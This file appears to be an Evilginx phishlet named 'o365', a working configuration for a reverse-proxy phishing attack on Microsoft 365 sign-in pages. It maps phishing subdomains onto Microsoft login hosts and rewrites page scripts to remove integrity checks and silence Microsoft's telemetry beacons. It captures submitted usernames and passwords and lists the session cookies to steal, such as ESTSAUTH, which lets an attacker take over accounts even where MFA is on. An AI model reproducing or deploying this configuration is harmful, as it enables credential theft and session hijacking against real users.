name: 'o365'
author: "@manan"
min_ver: '3.2.0'
redirect_url: 'https://office.com'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'account-live', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false}
  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
  - {phish_sub: 'events', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'f\.send\(e\.data\)', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth.net', search: 'f\.send\(e\.data\)', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: 'try{g\.sendPOST\(n,i,a\),e\.sendListener&&e\.sendListener\(A,n,a,t\.isBeacon\)}', replace: 'try{return;}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'aadcdn.msauth.net', orig_sub: 'aadcdn', domain: 'msauth', search: 'try{g\.sendPOST\(n,i,a\),e\.sendListener&&e\.sendListener\(A,n,a,t\.isBeacon\)}', replace: 'try{return;}', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}

auth_urls:
  - '/kmsi*'

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'CCState', 'buid', 'esctx', 'fpc']
  - domain: '.microsoftonline.com'
    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'CCState', 'x-ms-gateway-slice', 'stsservicecookie']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'
    
login:
  domain: 'login.microsoftonline.com'
  path: '/'
